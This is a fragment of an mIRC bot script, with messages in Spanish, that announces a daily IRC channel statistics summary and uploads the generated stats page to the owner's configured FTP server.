    if ($1 == f) && (%Stats.act) { msg $gettok(%Stats.act,1,32) ActualizaciÛn Finalizada, Resumen de estadÌsticas, $iif($gettok(%Stats.act,4-,32),Los que m·s han escrito hoy: $gettok(%Stats.act,4-,32),Hoy no ha escrito nadie.) | if (!%Stats.MWeb. [ $+ [ $gettok(%Stats.act,1,32) ] ]) { msg $gettok(%Stats.act,1,32) Puedes ver las estadÌsticas completas en 12 $+ %Stats.WEB $+ $lower($network) $+ / $+ $lower($right($gettok(%Stats.act,1,32),-1)) $+ .html } | else { msg $gettok(%Stats.act,1,32) Puedes ver las estadÌsticas completas escribiendo12 %PREFIX- [ $+ [ $gettok(%Stats.act,1,32) ] ] $+ Web } }
    .timerstats.ftp.unst -o 1 2 unset %Stats.act | .timerstats.ftp.unst2 -o 1 2 unset %Stats.ftp*
    if (%Stats.act) && ($exists(%rHcN $+ Stats\ $+ $gettok(%Stats.act,3,32)) == $true) { .remove %rHcN $+ Stats\ $+ $gettok(%Stats.act,3,32) }
} }
on *:SOCKOPEN:Stats.FTP:{ if ($sockerr > 0) { msg $gettok(%Stats.act,1,32) 2ERROR:2 Al intentar conectar con el servidor de las Stats. | Stats.FTP.c } }
on *:sockread:Stats.FTP:{
  sockread %Stats.FTP | tokenize 32 %Stats.FTP
  if (220 == $1) { sockwrite -n $sockname USER %Stats.User }
  if (331 == $1) { sockwrite -n $sockname PASS $decode(%Stats.PASS,m) }
  if (230 == $1) { sockwrite -n $sockname TYPE I | sockwrite -n $sockname PASV | sockwrite -n $sockname MKD %Stats.dir $+ $lower($network) | sockwrite -n $sockname STOR %Stats.dir $+ $lower($network) $+ / $+ $gettok(%Stats.act,3,32) }
  if (227 == $1) { sockclose Stats.FTP.load | sockopen Stats.FTP.load $remove($replace($gettok($5,1-4,44),$chr(44),$chr(46)) $calc($gettok($5,-2,44) * 256 + $gettok($5,-1,44)),$chr(40)) }
  if (530 == $1) { msg $gettok(%Stats.act,1,32) 2ERROR:2 Revise los datos de configuraciÛn del FTP. | Stats.FTP.c }
}
on *:sockclose:Stats.FTP:{ Stats.FTP.c }
